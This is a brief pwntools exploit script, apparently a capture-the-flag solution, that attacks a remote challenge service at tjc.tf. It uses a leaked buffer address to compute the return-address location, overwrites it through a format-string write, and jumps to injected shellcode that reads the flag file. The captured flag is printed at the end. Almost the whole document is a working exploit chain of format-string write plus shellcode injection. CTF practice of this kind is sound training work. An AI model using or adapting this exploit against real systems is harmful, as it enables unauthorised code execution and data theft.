from pwn import *

context.binary = "chall"
r = remote("tjc.tf", 31363)

# Obtain `inputBuffer` address from leak
buf_leak = r.recvline().decode()
buf_addr = int(buf_leak.split(",")[0], 16)
r.recv()

# Calculate the location of the return address
ret_addr_pos = buf_addr + 1048

# Put the printf write at the start and the shellcode at some offset into the inputBuffer
shellcode = asm(shellcraft.cat("/app/flag.txt"))
shellcode_offset = 512
write_part = fmtstr_payload(12, { ret_addr_pos: buf_addr + shellcode_offset })
payload = write_part + b"a"*(shellcode_offset-len(write_part)) + shellcode

# Execute the write
r.sendline(b"deposit")
r.recvuntil(b"Enter amount: ")
r.sendline(payload)
r.recv()

# Return to win!
r.sendline(b"exit")
print(r.recvall())

# Flag: tjctf{sys_c4ll3d_l1nux_294835}